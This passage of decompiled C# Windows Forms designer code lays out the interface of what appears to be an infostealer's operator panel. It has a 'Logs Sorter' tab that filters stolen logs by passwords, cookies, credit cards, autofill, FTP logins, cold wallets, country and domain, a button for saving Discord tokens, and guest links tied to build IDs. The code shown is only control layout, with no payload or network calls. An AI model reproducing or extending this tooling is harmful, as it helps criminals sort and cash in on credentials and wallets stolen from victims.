        ((System.Windows.Forms.Control)this.guestBuildID).Location = new System.Drawing.Point(476, 229);
        ((GuiLib.AnimaTextBox)this.guestBuildID).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.guestBuildID).MultiLine = false;
        ((System.Windows.Forms.Control)this.guestBuildID).Name = "guestBuildID";
        ((GuiLib.AnimaTextBox)this.guestBuildID).Numeric = false;
        ((GuiLib.AnimaTextBox)this.guestBuildID).ReadOnly = false;
        ((System.Windows.Forms.Control)this.guestBuildID).Size = new System.Drawing.Size(265, 23);
        ((System.Windows.Forms.Control)this.guestBuildID).TabIndex = 148;
        ((GuiLib.AnimaTextBox)this.guestBuildID).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label60).AutoSize = true;
        ((System.Windows.Forms.Control)this.label60).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label60).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label60).Location = new System.Drawing.Point(369, 233);
        ((System.Windows.Forms.Control)this.label60).Name = "label60";
        ((System.Windows.Forms.Control)this.label60).Size = new System.Drawing.Size(48, 15);
        ((System.Windows.Forms.Control)this.label60).TabIndex = 147;
        ((System.Windows.Forms.Control)this.label60).Text = "BuildID:";
        ((System.Windows.Forms.Control)this.addGuest).BackColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((System.Windows.Forms.ButtonBase)this.addGuest).FlatAppearance.BorderSize = 0;
        ((System.Windows.Forms.ButtonBase)this.addGuest).FlatStyle = System.Windows.Forms.FlatStyle.Popup;
        ((System.Windows.Forms.Control)this.addGuest).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.addGuest).ForeColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.addGuest).Location = new System.Drawing.Point(662, 296);
        ((System.Windows.Forms.Control)this.addGuest).Name = "addGuest";
        ((System.Windows.Forms.Control)this.addGuest).Size = new System.Drawing.Size(79, 26);
        ((System.Windows.Forms.Control)this.addGuest).TabIndex = 146;
        ((System.Windows.Forms.Control)this.addGuest).Text = "Create Link";
        ((System.Windows.Forms.ButtonBase)this.addGuest).UseVisualStyleBackColor = false;
        ((System.Windows.Forms.Control)this.addGuest).Click += new System.EventHandler(addGuest_Click);
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).AllowUserToAddRows = false;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).AllowUserToDeleteRows = false;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).AllowUserToResizeColumns = false;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).AllowUserToResizeRows = false;
        dataGridViewCellStyle11.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle11.BackColor = System.Drawing.Color.FromArgb(52, 60, 67);
        dataGridViewCellStyle11.Font = new System.Drawing.Font("Segoe UI", 9f);
        dataGridViewCellStyle11.ForeColor = System.Drawing.Color.Silver;
        dataGridViewCellStyle11.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).AlternatingRowsDefaultCellStyle = dataGridViewCellStyle11;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).AutoGenerateColumns = false;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).BackgroundColor = System.Drawing.Color.FromArgb(52, 60, 67);
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).BorderStyle = System.Windows.Forms.BorderStyle.None;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.RaisedVertical;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
        dataGridViewCellStyle12.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle12.BackColor = System.Drawing.Color.FromArgb(58, 62, 73);
        dataGridViewCellStyle12.Font = new System.Drawing.Font("Segoe UI", 9f);
        dataGridViewCellStyle12.ForeColor = System.Drawing.Color.Silver;
        dataGridViewCellStyle12.SelectionBackColor = System.Drawing.SystemColors.Highlight;
        dataGridViewCellStyle12.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
        dataGridViewCellStyle12.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).ColumnHeadersDefaultCellStyle = dataGridViewCellStyle12;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).Columns.AddRange((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn2, (System.Windows.Forms.DataGridViewColumn)this.buildIDDataGridViewTextBoxColumn1, (System.Windows.Forms.DataGridViewColumn)this.expiresTimeDataGridViewTextBoxColumn);
        ((System.Windows.Forms.Control)this.guestLinksDgv).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.bc;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).DataSource = this.object_19;
        dataGridViewCellStyle13.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle13.BackColor = System.Drawing.Color.FromArgb(58, 62, 73);
        dataGridViewCellStyle13.Font = new System.Drawing.Font("Segoe UI", 9f);
        dataGridViewCellStyle13.ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        dataGridViewCellStyle13.SelectionBackColor = System.Drawing.SystemColors.Highlight;
        dataGridViewCellStyle13.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
        dataGridViewCellStyle13.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).DefaultCellStyle = dataGridViewCellStyle13;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).EnableHeadersVisualStyles = false;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).GridColor = System.Drawing.Color.FromArgb(52, 60, 67);
        ((System.Windows.Forms.Control)this.guestLinksDgv).Location = new System.Drawing.Point(217, 9);
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).MultiSelect = false;
        ((System.Windows.Forms.Control)this.guestLinksDgv).Name = "guestLinksDgv";
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).ReadOnly = true;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Sunken;
        dataGridViewCellStyle14.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle14.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        dataGridViewCellStyle14.Font = new System.Drawing.Font("Segoe UI", 9f);
        dataGridViewCellStyle14.ForeColor = System.Drawing.Color.Silver;
        dataGridViewCellStyle14.SelectionBackColor = System.Drawing.SystemColors.Highlight;
        dataGridViewCellStyle14.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
        dataGridViewCellStyle14.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).RowHeadersDefaultCellStyle = dataGridViewCellStyle14;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
        dataGridViewCellStyle15.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle15.BackColor = System.Drawing.Color.FromArgb(52, 60, 67);
        dataGridViewCellStyle15.ForeColor = System.Drawing.Color.Silver;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).RowsDefaultCellStyle = dataGridViewCellStyle15;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).RowTemplate.DefaultCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).RowTemplate.DefaultCellStyle.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).RowTemplate.DefaultCellStyle.ForeColor = System.Drawing.Color.Silver;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        ((System.Windows.Forms.DataGridView)this.guestLinksDgv).ShowEditingIcon = false;
        ((System.Windows.Forms.Control)this.guestLinksDgv).Size = new System.Drawing.Size(701, 214);
        ((System.Windows.Forms.Control)this.guestLinksDgv).TabIndex = 145;
        ((System.Windows.Forms.Control)this.guestLinksDgv).DoubleClick += new System.EventHandler(guestLinksDgv_DoubleClick);
        ((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn2).DataPropertyName = "ID";
        ((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn2).HeaderText = "ID";
        ((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn2).Name = "iDDataGridViewTextBoxColumn2";
        ((System.Windows.Forms.DataGridViewBand)this.iDDataGridViewTextBoxColumn2).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn2).Width = 300;
        ((System.Windows.Forms.DataGridViewColumn)this.buildIDDataGridViewTextBoxColumn1).DataPropertyName = "BuildID";
        ((System.Windows.Forms.DataGridViewColumn)this.buildIDDataGridViewTextBoxColumn1).HeaderText = "BuildID";
        ((System.Windows.Forms.DataGridViewColumn)this.buildIDDataGridViewTextBoxColumn1).Name = "buildIDDataGridViewTextBoxColumn1";
        ((System.Windows.Forms.DataGridViewBand)this.buildIDDataGridViewTextBoxColumn1).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewColumn)this.buildIDDataGridViewTextBoxColumn1).Width = 200;
        ((System.Windows.Forms.DataGridViewColumn)this.expiresTimeDataGridViewTextBoxColumn).DataPropertyName = "ExpiresTime";
        ((System.Windows.Forms.DataGridViewColumn)this.expiresTimeDataGridViewTextBoxColumn).HeaderText = "ExpiresTime";
        ((System.Windows.Forms.DataGridViewColumn)this.expiresTimeDataGridViewTextBoxColumn).Name = "expiresTimeDataGridViewTextBoxColumn";
        ((System.Windows.Forms.DataGridViewBand)this.expiresTimeDataGridViewTextBoxColumn).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewColumn)this.expiresTimeDataGridViewTextBoxColumn).Width = 150;
        ((System.Windows.Forms.BindingSource)this.object_19).DataSource = typeof(Meta.SharedModels.GuestLink);
        ((System.Windows.Forms.Control)this.sorterTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.loadConfigBtn);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.saveConfigBtn);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.cookiesMoreThan);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label54);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.passMoreThan);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label55);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.saveDiscordTokensBtn);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.f5);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.f6);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.ef);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.f0);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.f1);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.f2);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.f3);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.f4);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.ee);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.e8);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.e9);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.d6);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.d5);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.be);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.bf);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.ea);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.eb);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.b8);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.b9);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.ba);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.bb);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.m_b1);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.m_ab);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.m_ac);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.m_ad);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.m_ae);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.m_af);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.m_b0);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.m_a9);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.m_aa);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.m_a7);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.m_a8);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.m_a1);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.m_a2);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleColdWalletSortCb);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label3);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.currentDomainLbl);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.metroSetLabel2);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.sortDomain);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.domainsTb);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.domainSorterLbl);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.metroSetLabel3);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleOsSortTb);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label17);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleFilesSortCb);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label16);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleFtpsSortCb);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label15);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleAfSortCb);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label14);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleCCsSortCb);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label13);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleCountrySortTb);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleSort);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleCookieSortTb);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label12);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider12);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singlePasswordSortTb);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label11);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleCommentSortTb);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label10);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleIdSortTb);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label9);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label8);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleStatusLbl);
        ((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.metroSetLabel1);
        ((System.Windows.Forms.Control)this.sorterTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.TabPage)this.sorterTab).Location = new System.Drawing.Point(194, 4);
        ((System.Windows.Forms.Control)this.sorterTab).Name = "sorterTab";
        ((System.Windows.Forms.Control)this.sorterTab).Size = new System.Drawing.Size(1168, 639);
        ((System.Windows.Forms.TabPage)this.sorterTab).TabIndex = 13;
        ((System.Windows.Forms.Control)this.sorterTab).Text = "Logs Sorter";
        ((MetroSet_UI.Controls.MetroSetButton)this.loadConfigBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.loadConfigBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.loadConfigBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.loadConfigBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.loadConfigBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.loadConfigBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.loadConfigBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.loadConfigBtn).Location = new System.Drawing.Point(30, 581);
        ((System.Windows.Forms.Control)this.loadConfigBtn).Name = "loadConfigBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.loadConfigBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.loadConfigBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.loadConfigBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.loadConfigBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.loadConfigBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.loadConfigBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.loadConfigBtn).Size = new System.Drawing.Size(148, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.loadConfigBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.loadConfigBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.loadConfigBtn).TabIndex = 394;
        ((System.Windows.Forms.Control)this.loadConfigBtn).Text = "Load config";
        ((MetroSet_UI.Controls.MetroSetButton)this.loadConfigBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.loadConfigBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.loadConfigBtn).Click += new System.EventHandler(loadConfigBtn_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveConfigBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveConfigBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveConfigBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.saveConfigBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveConfigBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveConfigBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveConfigBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.saveConfigBtn).Location = new System.Drawing.Point(30, 552);
        ((System.Windows.Forms.Control)this.saveConfigBtn).Name = "saveConfigBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.saveConfigBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveConfigBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveConfigBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.saveConfigBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveConfigBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveConfigBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.saveConfigBtn).Size = new System.Drawing.Size(149, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveConfigBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.saveConfigBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.saveConfigBtn).TabIndex = 393;
        ((System.Windows.Forms.Control)this.saveConfigBtn).Text = "Save config";
        ((MetroSet_UI.Controls.MetroSetButton)this.saveConfigBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.saveConfigBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.saveConfigBtn).Click += new System.EventHandler(saveConfigBtn_Click);
        ((System.Windows.Forms.Control)this.cookiesMoreThan).Location = new System.Drawing.Point(355, 302);
        ((System.Windows.Forms.NumericUpDown)this.cookiesMoreThan).Maximum = new decimal(new int[4] { 10000, 0, 0, 0 });
        ((System.Windows.Forms.NumericUpDown)this.cookiesMoreThan).Minimum = new decimal(new int[4] { 1, 0, 0, -2147483648 });
        ((System.Windows.Forms.Control)this.cookiesMoreThan).Name = "cookiesMoreThan";
        ((System.Windows.Forms.Control)this.cookiesMoreThan).Size = new System.Drawing.Size(44, 20);
        ((System.Windows.Forms.Control)this.cookiesMoreThan).TabIndex = 390;
        ((System.Windows.Forms.NumericUpDown)this.cookiesMoreThan).Value = new decimal(new int[4] { 1, 0, 0, -2147483648 });
        ((System.Windows.Forms.Control)this.label54).AutoSize = true;
        ((System.Windows.Forms.Control)this.label54).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label54).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label54).Location = new System.Drawing.Point(196, 303);
        ((System.Windows.Forms.Control)this.label54).Name = "label54";
        ((System.Windows.Forms.Control)this.label54).Size = new System.Drawing.Size(87, 15);
        ((System.Windows.Forms.Control)this.label54).TabIndex = 389;
        ((System.Windows.Forms.Control)this.label54).Text = "Cookies > than";
        ((System.Windows.Forms.Control)this.passMoreThan).Location = new System.Drawing.Point(135, 302);
        ((System.Windows.Forms.NumericUpDown)this.passMoreThan).Maximum = new decimal(new int[4] { 10000, 0, 0, 0 });
        ((System.Windows.Forms.NumericUpDown)this.passMoreThan).Minimum = new decimal(new int[4] { 1, 0, 0, -2147483648 });
        ((System.Windows.Forms.Control)this.passMoreThan).Name = "passMoreThan";
        ((System.Windows.Forms.Control)this.passMoreThan).Size = new System.Drawing.Size(44, 20);
        ((System.Windows.Forms.Control)this.passMoreThan).TabIndex = 388;
        ((System.Windows.Forms.NumericUpDown)this.passMoreThan).Value = new decimal(new int[4] { 1, 0, 0, -2147483648 });
        ((System.Windows.Forms.Control)this.label55).AutoSize = true;
        ((System.Windows.Forms.Control)this.label55).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label55).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label55).Location = new System.Drawing.Point(27, 303);
        ((System.Windows.Forms.Control)this.label55).Name = "label55";
        ((System.Windows.Forms.Control)this.label55).Size = new System.Drawing.Size(100, 15);
        ((System.Windows.Forms.Control)this.label55).TabIndex = 387;
        ((System.Windows.Forms.Control)this.label55).Text = "Passwords > then";
        ((MetroSet_UI.Controls.MetroSetButton)this.saveDiscordTokensBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveDiscordTokensBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveDiscordTokensBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.saveDiscordTokensBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveDiscordTokensBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveDiscordTokensBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveDiscordTokensBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.saveDiscordTokensBtn).Location = new System.Drawing.Point(253, 612);
        ((System.Windows.Forms.Control)this.saveDiscordTokensBtn).Name = "saveDiscordTokensBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.saveDiscordTokensBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveDiscordTokensBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveDiscordTokensBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.saveDiscordTokensBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveDiscordTokensBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveDiscordTokensBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.saveDiscordTokensBtn).Size = new System.Drawing.Size(147, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveDiscordTokensBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.saveDiscordTokensBtn).StyleManager = null;
